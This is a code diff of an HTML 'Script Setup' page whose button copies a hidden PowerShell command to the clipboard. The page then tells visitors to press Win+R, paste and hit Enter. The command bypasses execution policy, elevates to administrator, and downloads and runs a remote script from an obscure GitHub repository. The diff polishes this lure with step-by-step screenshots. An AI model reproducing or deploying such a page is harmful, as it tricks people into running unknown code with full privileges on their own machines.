@@ -2,44 +2,53 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Command Launcher</title>
+    <title>Start Command Launcher</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0d1117; color: white; margin: 0; }
-        .container { text-align: center; background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 500px; }
-        h1 { margin-bottom: 10px; font-size: 24px; }
-        p { color: #8b949e; margin-bottom: 30px; line-height: 1.5; }
-        .btn { background-color: #238636; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: background 0.2s; width: 100%; }
-        .btn:hover { background-color: #2ea44f; }
-        .instructions { margin-top: 25px; text-align: left; background: #0d1117; padding: 15px; border-radius: 6px; font-size: 14px; border: 1px dashed #30363d; }
-        .step { color: #58a6ff; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; padding: 40px 0; margin: 0; }
+        .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; max-width: 600px; width: 90%; }
+        .btn { background: #238636; color: white; padding: 20px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
+        .btn:hover { background: #2ea44f; transform: scale(1.02); }
+        .step-box { margin-top: 30px; text-align: left; background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
+        .step-title { color: #58a6ff; font-weight: bold; font-size: 18px; margin-bottom: 10px; display: block; }
+        img { width: 100%; max-width: 450px; border-radius: 8px; margin: 15px 0; border: 1px solid #444; }
+        kbd { background: #30363d; padding: 3px 6px; border-radius: 4px; font-family: monospace; color: white; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>Script Setup</h1>
-    <p>Click the button to copy the start command, then follow the instructions below.</p>
+    <p>Follow the steps below to run the command.</p>
 
-    <button class="btn" onclick="copyCommand()">🚀 Start Command</button>
+    <button class="btn" onclick="copyCmd()">🚀 START COMMAND</button>
 
-    <div class="instructions">
-        <div><span class="step">Step 1:</span> Click the green button above.</div>
-        <div style="margin-top: 10px;"><span class="step">Step 2:</span> Press <kbd style="background:#30363d; padding: 2px 5px; border-radius:3px;">Win + R</kbd> on your keyboard.</div>
-        <div style="margin-top: 10px;"><span class="step">Step 3:</span> Paste (Ctrl+V) and press <b>Enter</b>.</div>
+    <div class="step-box">
+        <span class="step-title">Step 1: Open Run Box</span>
+        <p>Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard at the same time.</p>
+        <img src="https://www.wikihow.com/images/thumb/7/7e/Open-the-Run-Command-on-Windows-10-Step-1-Version-3.jpg/v4-728px-Open-the-Run-Command-on-Windows-10-Step-1-Version-3.jpg" alt="Keyboard Shortcut">
+    </div>
+
+    <div class="step-box">
+        <span class="step-title">Step 2: Paste and Run</span>
+        <p>Right-click in the box, select <b>Paste</b>, and press <b>Enter</b>.</p>
+        <img src="https://www.lifewire.com/thmb/x2N8T6h2_Gv8xL-t2E-Hl_X-v-g=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/run-command-windows-10-5ba2d7c046e0fb00259e83e2.png" alt="Run Window">
     </div>
 </div>
 
 <script>
-    function copyCommand() {
-        const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
-        
-        navigator.clipboard.writeText(cmd).then(() => {
-            alert("Command Copied! Now press Win+R and paste it.");
-        }).catch(err => {
-            console.error('Failed to copy: ', err);
-        });
-    }
+function copyCmd() {
+    const command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
+    
+    // Copy to clipboard
+    const el = document.createElement('textarea');
+    el.value = command;
+    document.body.appendChild(el);
+    el.select();
+    document.execCommand('copy');
+    document.body.removeChild(el);
+
+    alert("Command Copied! Now press Win+R to paste.");
+}
 </script>
 
 </body>
